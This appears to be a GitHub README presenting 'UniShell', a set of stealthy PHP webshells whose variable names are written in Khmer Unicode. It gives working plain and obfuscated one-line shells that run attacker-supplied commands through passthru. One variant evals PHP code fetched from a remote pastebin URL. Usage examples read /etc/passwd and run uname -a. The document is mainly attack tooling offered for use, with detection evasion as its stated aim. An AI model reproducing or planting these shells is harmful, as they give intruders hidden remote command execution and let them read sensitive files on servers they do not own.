# UniShell
Unishell is a family of php webshells that based on nano shell (https://github.com/s0md3v/nano) which are using khmer unicode characters (ក, ខ, គ) and "yak" objuscation to be extremely stealthy and silently.

### None-Obfuscate
1. Soriya

`<?$ា=$_GET;if($ា[ត]!=null)$ា[ល]==ធិ៤០៤&$ា[ម]($ា[ប]);?>`

### Option
`ត` = Any;
`ល` = Password
`ម` = Function
`ប` = Command

### Usage

`http/s://testing.com/unishell.php?ត=any&ល=password&ម=function&ប=command`

For example we want to show the /etc/passwd in the system so we use:

`http/s://testing.com/unishell.php?ត=true&ល=ធិ៤០៤&ម=passthru&ប=cat /etc/passwd`

### Screenshot-1
![handler](https://i.imgur.com/9fBhdpm.png)

2. Kolab

`<?$ា=$_GET;if($ា[ត]!=null)$ា[ល]==ធិ៤០៤&$ា[ម]($ា[ប]); eval('?>'.file_get_contents($ា[ដ]));?>`

### Option
`ត` = Any;
`ល` = Password
`ម` = Function
`ប` = Command
`ដ` = Url

### Usage

`http/s://testing.com/unishell.php?ត=any&ល=password&ម=function&ប=command&ដ=url`

For example we want to show and use the PHP Web Shell from another url, so it will be:

`http/s://testing.com/unishell.php?ត=true&ល=ធិ៤០៤&ម=passthru&ប=uname -a&ដ=https://pastebin.com/raw/JfLvh0MG`

### Screenshot-2

![handler](https://i.imgur.com/kLo23hE.png)

### Screenshot-3

![handler](https://i.imgur.com/WKmeVP1.png)

### Obfuscated
In this code below i used yak to obfuscated it.

1. Soriya
`<?php goto JFDwF; NnbkH: $gOzsO[ល] == ធិ៤០៤ & $gOzsO[ម]($gOzsO[ប]); goto ymB7H; B3hLL: if (!($gOzsO[ត] != null)) { goto y8I95; } goto NnbkH; JFDwF: $gOzsO = $_GET; goto B3hLL; ymB7H: y8I95: ?>`

2. Kolab
`<?php goto N6Ag4; KMKUH: $I9NO2[ល] == ធិ៤០៤ & $I9NO2[ម]($I9NO2[ប]); goto cuHHG; N6Ag4: $I9NO2 = $_GET; goto clZU6; clZU6: if (!($I9NO2[ត] != null)) { goto P0yeE; } goto KMKUH; cuHHG: P0yeE: goto hYsr_; hYsr_: eval("\x3f\x3e" . file_get_contents($I9NO2[ដ])); ?>`

### License
If you want to use or modify it, just give me a credit or some donation. xD
